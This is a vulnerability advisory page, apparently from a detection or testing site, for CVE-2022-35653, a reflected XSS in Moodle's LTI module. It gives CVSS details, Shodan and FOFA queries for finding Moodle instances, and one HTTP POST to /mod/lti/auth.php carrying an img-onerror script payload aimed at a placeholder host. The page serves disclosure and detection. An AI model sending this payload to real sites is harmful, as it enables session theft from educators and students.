---
layout: post
cve_id: CVE-2022-35653
title: Moodle LTI module Reflected - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-35653.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-35653.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,pdresearch
severity: medium
impact: 'Attackers can inject malicious JavaScript through the LTI module that executes
  in educators'' or students'' browsers, potentially stealing Moodle session credentials
  and accessing sensitive course information.

  '
remediation: 'Update Moodle to a patched version that properly sanitizes user input
  in the LTI module and prevents execution of injected scripts.

  '
reference:
- http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-72299
- https://nvd.nist.gov/vuln/detail/CVE-2022-35653
- https://bugzilla.redhat.com/show_bug.cgi?id=2106277
- https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6MOKYVRNFNAODP2XSMGJ5CRDUZCZKAR3/
- https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MTKUSFPSYFINSQFSOHDQIDVE6FWBEU6V/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-35653
  cwe-id: CWE-79
  epss-score: 0.82285
  epss-percentile: 0.99184
  cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: moodle
  product: moodle
  shodan-query:
  - title:"Moodle"
  - cpe:"cpe:2.3:a:moodle:moodle"
  - http.title:"moodle"
  fofa-query: title="moodle"
  google-query: intitle:"moodle"
tags:
- cve
- cve2022
- moodle
- xss
- vkev
- vuln
---

## ðŸ” Vulnerability Description
A reflected XSS issue was identified in the LTI module of Moodle. The vulnerability exists due to insufficient sanitization of user-supplied data in the LTI module. A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website to steal potentially sensitive information, change appearance of the web page, can perform phishing and drive-by-download attacks.


## ðŸŒ HTTP Request
```nohighlight
POST /mod/lti/auth.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:139.0) Gecko/20100101 Firefox/139.0
Connection: close
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

xxx"><img/src%3d'x'onerror%3dalert('document_domain')>=1
```

